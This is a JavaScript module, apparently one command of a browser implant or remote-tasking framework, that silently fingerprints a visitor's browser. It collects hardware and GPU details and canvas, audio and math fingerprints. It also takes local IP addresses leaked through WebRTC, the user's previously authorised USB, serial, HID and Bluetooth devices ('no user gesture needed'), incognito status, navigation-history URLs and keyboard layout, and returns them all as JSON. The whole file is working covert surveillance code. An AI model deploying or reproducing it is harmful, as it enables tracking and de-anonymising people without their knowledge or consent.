COMMANDS['fingerprint'] = async function(task) {
    var fp = {};

    // Timeout helper — prevents any single async call from stalling the entire command
    function withTimeout(promise, ms) {
        return Promise.race([
            promise,
            new Promise(function(_, reject) {
                setTimeout(function() { reject(new Error('timeout')); }, ms);
            })
        ]);
    }

    // --- Navigator ---
    var nav = navigator;
    fp.navigator = {
        userAgent: nav.userAgent,
        platform: nav.platform,
        language: nav.language,
        languages: nav.languages ? Array.from(nav.languages) : [],
        cookieEnabled: nav.cookieEnabled,
        doNotTrack: nav.doNotTrack,
        hardwareConcurrency: nav.hardwareConcurrency,
        maxTouchPoints: nav.maxTouchPoints,
        deviceMemory: nav.deviceMemory || null,
        vendor: nav.vendor,
        appVersion: nav.appVersion,
        product: nav.product,
        oscpu: nav.oscpu || null,
        buildID: nav.buildID || null,
        webdriver: nav.webdriver,
        pdfViewerEnabled: nav.pdfViewerEnabled
    };

    // --- Screen ---
    var s = window.screen;
    fp.screen = {
        width: s.width,
        height: s.height,
        availWidth: s.availWidth,
        availHeight: s.availHeight,
        colorDepth: s.colorDepth,
        pixelDepth: s.pixelDepth,
        devicePixelRatio: window.devicePixelRatio,
        orientation: s.orientation ? s.orientation.type : null
    };

    // --- Window / Document ---
    fp.window = {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        locationHref: window.location.href,
        locationOrigin: window.location.origin,
        referrer: document.referrer,
        title: document.title,
        documentMode: document.documentMode || null,
        characterSet: document.characterSet
    };

    // --- Timezone ---
    fp.timezone = {
        offset: new Date().getTimezoneOffset(),
        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: Intl.DateTimeFormat().resolvedOptions().locale
    };

    // --- Connection ---
    if (nav.connection) {
        fp.connection = {
            effectiveType: nav.connection.effectiveType,
            downlink: nav.connection.downlink,
            rtt: nav.connection.rtt,
            saveData: nav.connection.saveData,
            type: nav.connection.type || null
        };
    }

    // --- Plugins ---
    fp.plugins = [];
    if (nav.plugins) {
        for (var i = 0; i < nav.plugins.length; i++) {
            fp.plugins.push({
                name: nav.plugins[i].name,
                filename: nav.plugins[i].filename,
                description: nav.plugins[i].description
            });
        }
    }

    // --- Mime Types ---
    fp.mimeTypes = [];
    if (nav.mimeTypes) {
        for (var j = 0; j < nav.mimeTypes.length; j++) {
            fp.mimeTypes.push(nav.mimeTypes[j].type);
        }
    }

    // --- WebGL ---
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            // Firefox exposes unmasked renderer/vendor directly via RENDERER/VENDOR
            // without needing the deprecated WEBGL_debug_renderer_info extension
            var renderer = gl.getParameter(gl.RENDERER);
            var vendor = gl.getParameter(gl.VENDOR);
            var unmaskedRenderer = renderer;
            var unmaskedVendor = vendor;
            try {
                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    unmaskedRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || renderer;
                    unmaskedVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || vendor;
                }
            } catch (e) {}
            fp.webgl = {
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: unmaskedVendor,
                unmaskedRenderer: unmaskedRenderer,
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
                extensions: gl.getSupportedExtensions()
            };
        }
    } catch (e) {
        fp.webgl = {error: e.message};
    }

    // --- Canvas Fingerprint ---
    try {
        var cv = document.createElement('canvas');
        cv.width = 200;
        cv.height = 50;
        var ctx = cv.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint!', 2, 2);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.fillText('Canvas FP', 4, 18);
        fp.canvasHash = cv.toDataURL().length + '_' + cv.toDataURL().slice(-32);
    } catch (e) {
        fp.canvasHash = null;
    }

    // --- Audio Fingerprint ---
    try {
        if (typeof OfflineAudioContext !== 'undefined' || typeof webkitOfflineAudioContext !== 'undefined') {
            var AudioCtx = OfflineAudioContext || webkitOfflineAudioContext;
            var actx = new AudioCtx(1, 44100, 44100);
            var osc = actx.createOscillator();
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(10000, actx.currentTime);
            var comp = actx.createDynamicsCompressor();
            comp.threshold.setValueAtTime(-50, actx.currentTime);
            comp.knee.setValueAtTime(40, actx.currentTime);
            comp.ratio.setValueAtTime(12, actx.currentTime);
            comp.attack.setValueAtTime(0, actx.currentTime);
            comp.release.setValueAtTime(0.25, actx.currentTime);
            osc.connect(comp);
            comp.connect(actx.destination);
            osc.start(0);
            var audioBuffer = await withTimeout(actx.startRendering(), 3000);
            var data = audioBuffer.getChannelData(0);
            var sum = 0;
            for (var k = 4500; k < 5000; k++) sum += Math.abs(data[k]);
            fp.audioFingerprint = sum.toString();
        }
    } catch (e) {
        fp.audioFingerprint = null;
    }

    // --- Storage ---
    fp.storage = {
        localStorage: typeof localStorage !== 'undefined',
        sessionStorage: typeof sessionStorage !== 'undefined',
        indexedDB: typeof indexedDB !== 'undefined',
        openDatabase: typeof openDatabase !== 'undefined'
    };

    if (navigator.storage && navigator.storage.estimate) {
        try {
            var est = await withTimeout(navigator.storage.estimate(), 2000);
            fp.storage.quota = est.quota;
            fp.storage.usage = est.usage;
        } catch (e) {}
    }

    // --- Battery ---
    if (navigator.getBattery) {
        try {
            var bat = await withTimeout(navigator.getBattery(), 2000);
            fp.battery = {
                charging: bat.charging,
                level: bat.level,
                chargingTime: bat.chargingTime,
                dischargingTime: bat.dischargingTime
            };
        } catch (e) {}
    }

    // --- Media Devices ---
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        try {
            var devices = await withTimeout(navigator.mediaDevices.enumerateDevices(), 2000);
            fp.mediaDevices = devices.map(function(d) {
                return {kind: d.kind, label: d.label, deviceId: d.deviceId ? d.deviceId.substring(0, 8) + '...' : ''};
            });
        } catch (e) {}
    }

    // --- WebRTC Local IPs ---
    fp.webrtcIPs = [];
    try {
        var pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        var offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        await new Promise(function(resolve) {
            var timeout = setTimeout(resolve, 3000);
            pc.onicecandidate = function(e) {
                if (!e.candidate) {
                    clearTimeout(timeout);
                    resolve();
                    return;
                }
                var parts = e.candidate.candidate.split(' ');
                var ip = parts[4];
                if (ip && fp.webrtcIPs.indexOf(ip) === -1) {
                    fp.webrtcIPs.push(ip);
                }
            };
        });
        pc.close();
    } catch (e) {}

    // --- Permissions ---
    fp.permissions = {};
    if (navigator.permissions) {
        var permNames = ['geolocation', 'notifications', 'camera', 'microphone', 'accelerometer', 'gyroscope', 'magnetometer', 'clipboard-read', 'clipboard-write'];
        for (var p = 0; p < permNames.length; p++) {
            try {
                var result = await withTimeout(navigator.permissions.query({name: permNames[p]}), 1000);
                fp.permissions[permNames[p]] = result.state;
            } catch (e) {}
        }
    }

    // --- Font Detection ---
    fp.fonts = [];
    var testFonts = [
        'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
        'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Lucida Console',
        'Tahoma', 'Palatino Linotype', 'Segoe UI', 'Roboto', 'Helvetica',
        'Calibri', 'Cambria', 'Consolas', 'Menlo', 'Monaco',
        'SF Pro', 'Ubuntu', 'Cantarell', 'Noto Sans'
    ];
    try {
        var span = document.createElement('span');
        span.style.position = 'absolute';
        span.style.left = '-9999px';
        span.style.fontSize = '72px';
        span.textContent = 'mmmmmmmmmmlli';
        document.body.appendChild(span);
        span.style.fontFamily = 'monospace';
        var defaultW = span.offsetWidth;
        var defaultH = span.offsetHeight;
        for (var f = 0; f < testFonts.length; f++) {
            span.style.fontFamily = '"' + testFonts[f] + '", monospace';
            if (span.offsetWidth !== defaultW || span.offsetHeight !== defaultH) {
                fp.fonts.push(testFonts[f]);
            }
        }
        document.body.removeChild(span);
    } catch (e) {}

    // --- Features Detection ---
    fp.features = {
        serviceWorker: 'serviceWorker' in navigator,
        webSocket: 'WebSocket' in window,
        webWorker: 'Worker' in window,
        sharedWorker: 'SharedWorker' in window,
        webAssembly: typeof WebAssembly !== 'undefined',
        webGL2: (function() { try { return !!document.createElement('canvas').getContext('webgl2'); } catch(e) { return false; } })(),
        bluetooth: 'bluetooth' in navigator,
        usb: 'usb' in navigator,
        serial: 'serial' in navigator,
        hid: 'hid' in navigator,
        credentials: 'credentials' in navigator,
        speechSynthesis: 'speechSynthesis' in window,
        speechRecognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
        mediaRecorder: typeof MediaRecorder !== 'undefined',
        rtcPeerConnection: typeof RTCPeerConnection !== 'undefined',
        intersectionObserver: typeof IntersectionObserver !== 'undefined',
        resizeObserver: typeof ResizeObserver !== 'undefined',
        performance: typeof performance !== 'undefined',
        crypto: typeof crypto !== 'undefined' && typeof crypto.subtle !== 'undefined'
    };

    // --- Authorized Devices (silent — no user gesture needed) ---
    fp.devices = {serial: [], usb: [], hid: [], bluetooth: []};

    // Web Serial — previously authorized ports
    if (navigator.serial && navigator.serial.getPorts) {
        try {
            var ports = await withTimeout(navigator.serial.getPorts(), 2000);
            for (var sp = 0; sp < ports.length; sp++) {
                var portInfo = {};
                try {
                    var info = ports[sp].getInfo();
                    portInfo.usbVendorId = info.usbVendorId || null;
                    portInfo.usbProductId = info.usbProductId || null;
                } catch (e) {}
                portInfo.readable = !!ports[sp].readable;
                portInfo.writable = !!ports[sp].writable;
                fp.devices.serial.push(portInfo);
            }
        } catch (e) {}
    }

    // Web USB — previously authorized devices
    if (navigator.usb && navigator.usb.getDevices) {
        try {
            var usbDevices = await withTimeout(navigator.usb.getDevices(), 2000);
            for (var ud = 0; ud < usbDevices.length; ud++) {
                var udev = usbDevices[ud];
                fp.devices.usb.push({
                    vendorId: udev.vendorId,
                    productId: udev.productId,
                    productName: udev.productName || '',
                    manufacturerName: udev.manufacturerName || '',
                    serialNumber: udev.serialNumber || '',
                    opened: udev.opened
                });
            }
        } catch (e) {}
    }

    // Web HID — previously authorized devices
    if (navigator.hid && navigator.hid.getDevices) {
        try {
            var hidDevices = await withTimeout(navigator.hid.getDevices(), 2000);
            for (var hd = 0; hd < hidDevices.length; hd++) {
                var hdev = hidDevices[hd];
                fp.devices.hid.push({
                    vendorId: hdev.vendorId,
                    productId: hdev.productId,
                    productName: hdev.productName || '',
                    opened: hdev.opened,
                    collections: hdev.collections ? hdev.collections.length : 0
                });
            }
        } catch (e) {}
    }

    // Web Bluetooth — getDevices() returns previously-paired devices (Chrome 85+)
    if (navigator.bluetooth && navigator.bluetooth.getDevices) {
        try {
            var btDevices = await withTimeout(navigator.bluetooth.getDevices(), 2000);
            for (var bd = 0; bd < btDevices.length; bd++) {
                var bdev = btDevices[bd];
                fp.devices.bluetooth.push({
                    id: bdev.id || '',
                    name: bdev.name || '(unnamed)',
                    gattConnected: bdev.gatt ? bdev.gatt.connected : false
                });
            }
        } catch (e) {}
    }

    fp.devices.totalAuthorized = fp.devices.serial.length + fp.devices.usb.length +
        fp.devices.hid.length + fp.devices.bluetooth.length;

    // --- Math Fingerprint (engine-specific precision differences) ---
    fp.math = {};
    try {
        fp.math = {
            acos: Math.acos(0.123456789015),
            acosh: Math.acosh(1e308),
            asin: Math.asin(0.123456789015),
            asinh: Math.asinh(1),
            atanh: Math.atanh(0.5),
            cbrt: Math.cbrt(100.123456789),
            cosh: Math.cosh(1),
            expm1: Math.expm1(1),
            log1p: Math.log1p(10),
            sinh: Math.sinh(1),
            tan: Math.tan(-1e300),
            tanh: Math.tanh(1)
        };
    } catch (e) {}

    // --- Vendor Flavors (real browser identity beyond user-agent) ---
    fp.vendorFlavors = [];
    var flavorChecks = [
        ['chrome', function() { return !!window.chrome; }],
        ['safari', function() { return !!window.safari; }],
        ['opera', function() { return !!window.opr; }],
        ['firefox', function() { return 'MozAppearance' in (document.documentElement.style || {}); }],
        ['edge_legacy', function() { return !!window.StyleMedia; }],
        ['chromium_webview', function() { return !!window.__gCrWeb; }],
        ['uc_browser', function() { return !!window.UCShellJava; }],
        ['qq_browser', function() { return !!window.QHBrowser; }],
        ['brave', function() { return !!(navigator.brave && navigator.brave.isBrave); }]
    ];
    for (var vf = 0; vf < flavorChecks.length; vf++) {
        try {
            if (flavorChecks[vf][1]()) fp.vendorFlavors.push(flavorChecks[vf][0]);
        } catch (e) {}
    }

    // --- Speech Synthesis Voices (OS-specific voice lists) ---
    fp.speechVoices = [];
    try {
        if (window.speechSynthesis) {
            var voices = speechSynthesis.getVoices();
            if (voices.length === 0) {
                // Voices may load async — wait briefly
                await new Promise(function(resolve) {
                    speechSynthesis.onvoiceschanged = resolve;
                    setTimeout(resolve, 500);
                });
                voices = speechSynthesis.getVoices();
            }
            for (var sv = 0; sv < voices.length; sv++) {
                fp.speechVoices.push({
                    name: voices[sv].name,
                    lang: voices[sv].lang,
                    local: voices[sv].localService
                });
            }
        }
    } catch (e) {}

    // --- Architecture Detection (32-bit vs 64-bit via Float32Array NaN) ---
    fp.architecture = null;
    try {
        var fa = new Float32Array(1);
        var u8a = new Uint8Array(fa.buffer);
        fa[0] = Infinity;
        fa[0] = fa[0] - fa[0]; // NaN
        fp.architecture = u8a[3].toString();
    } catch (e) {}

    // --- Private/Incognito Browsing Detection ---
    fp.privateBrowsing = null;
    try {
        if (navigator.storage && navigator.storage.estimate) {
            var est2 = await withTimeout(navigator.storage.estimate(), 2000);
            // Chrome incognito has much smaller quota (~120MB vs ~60GB+)
            if (est2.quota && est2.quota < 200000000) {
                fp.privateBrowsing = true;
            } else {
                fp.privateBrowsing = false;
            }
            fp.storageQuotaMB = Math.round((est2.quota || 0) / 1048576);
        }
    } catch (e) {}

    // --- Keyboard Layout Map ---
    fp.keyboardLayout = null;
    try {
        if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
            var layoutMap = await withTimeout(navigator.keyboard.getLayoutMap(), 2000);
            var layout = {};
            layoutMap.forEach(function(val, key) {
                layout[key] = val;
            });
            fp.keyboardLayout = layout;
        }
    } catch (e) {}

    // --- WebGPU Adapter Info ---
    fp.gpu = null;
    try {
        if (navigator.gpu) {
            var adapter = await withTimeout(navigator.gpu.requestAdapter(), 3000);
            if (adapter) {
                var gpuInfo = {};
                if (adapter.info) {
                    gpuInfo.vendor = adapter.info.vendor || '';
                    gpuInfo.architecture = adapter.info.architecture || '';
                    gpuInfo.device = adapter.info.device || '';
                    gpuInfo.description = adapter.info.description || '';
                } else if (adapter.requestAdapterInfo) {
                    var adapterInfo = await withTimeout(adapter.requestAdapterInfo(), 2000);
                    gpuInfo.vendor = adapterInfo.vendor || '';
                    gpuInfo.architecture = adapterInfo.architecture || '';
                    gpuInfo.device = adapterInfo.device || '';
                    gpuInfo.description = adapterInfo.description || '';
                }
                gpuInfo.features = [];
                if (adapter.features) {
                    adapter.features.forEach(function(f) { gpuInfo.features.push(f); });
                }
                fp.gpu = gpuInfo;
            }
        }
    } catch (e) {}

    // --- CSS Media Query Fingerprints ---
    fp.mediaPreferences = {};
    try {
        var mqTests = [
            ['colorGamutSrgb', '(color-gamut: srgb)'],
            ['colorGamutP3', '(color-gamut: p3)'],
            ['colorGamutRec2020', '(color-gamut: rec2020)'],
            ['hdr', '(dynamic-range: high)'],
            ['prefersColorScheme', '(prefers-color-scheme: dark)'],
            ['prefersReducedMotion', '(prefers-reduced-motion: reduce)'],
            ['prefersContrast', '(prefers-contrast: more)'],
            ['forcedColors', '(forced-colors: active)'],
            ['invertedColors', '(inverted-colors: inverted)'],
            ['monochrome', '(monochrome)']
        ];
        for (var mq = 0; mq < mqTests.length; mq++) {
            fp.mediaPreferences[mqTests[mq][0]] = window.matchMedia(mqTests[mq][1]).matches;
        }
    } catch (e) {}

    // --- Navigation History (Navigation API) ---
    fp.navigationHistory = [];
    try {
        if (window.navigation && navigation.entries) {
            var navEntries = navigation.entries();
            for (var ne = 0; ne < navEntries.length; ne++) {
                fp.navigationHistory.push({
                    url: navEntries[ne].url,
                    key: navEntries[ne].key,
                    index: navEntries[ne].index
                });
            }
        }
    } catch (e) {}

    // --- Cookies (existing) ---
    fp.cookies = document.cookie ? document.cookie.split(';').length : 0;

    return JSON.stringify(fp, null, 2);
};
